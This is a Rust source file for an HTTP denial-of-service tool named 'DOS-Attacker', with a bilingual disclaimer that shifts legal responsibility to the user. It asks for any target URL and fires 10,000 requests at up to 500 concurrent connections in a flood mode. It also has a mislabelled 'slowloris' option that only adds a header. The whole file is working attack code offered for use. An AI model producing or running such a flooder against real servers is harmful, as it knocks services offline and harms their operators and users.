use reqwest::ClientBuilder;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Semaphore;
use tokio::time;
use rand::Rng;
use std::io;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("DOS-Attacker (User assumes all legal responsibility for using this tool) / داس اتکر (تمامی عواقب قانونی استفاده از این ابراز بر عهده کاربر می باشد)");

    println!("Enter target URL (including http:// or https://):");
    let mut target_url = String::new();
    io::stdin().read_line(&mut target_url)?;
    let target_url = target_url.trim();

    let num_requests = 10_000;
    let max_concurrent = 500;
    let enable_flood_mode = true;
    let enable_slowloris = false;

    let client = ClientBuilder::new()
    .timeout(Duration::from_secs(30))
    .tcp_keepalive(Duration::from_secs(60))
    .http1_only()
    .build()?;

    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    let target_url = Arc::new(target_url.to_string());

    println!("Starting {} requests ({} concurrent)", num_requests, max_concurrent);

    let start_time = Instant::now();
    let mut tasks = Vec::with_capacity(num_requests);

    for i in 0..num_requests {
        let permit = semaphore.clone().acquire_owned().await?;
        let client = client.clone();
        let target_url = target_url.clone();

        tasks.push(tokio::spawn(async move {
            if !enable_flood_mode {
                let delay_ms = rand::thread_rng().gen_range(50..500);
                time::sleep(Duration::from_millis(delay_ms)).await;
            }

            if enable_slowloris && i % 10 == 0 {
                let _ = client
                .get(target_url.as_str())
                .header("X-Slowloris", "partial")
                .body("")
                .send()
                .await;
            } else {
                match client.get(target_url.as_str()).send().await {
                    Ok(resp) => println!("Request {}: Status {}", i, resp.status()),
                                Err(e) => println!("Request {} failed: {}", i, e),
                }
            }

            drop(permit);
        }));
    }

    futures::future::join_all(tasks).await;
    let duration = start_time.elapsed();
    println!("Completed in {:.2?}", duration);

    Ok(())
}
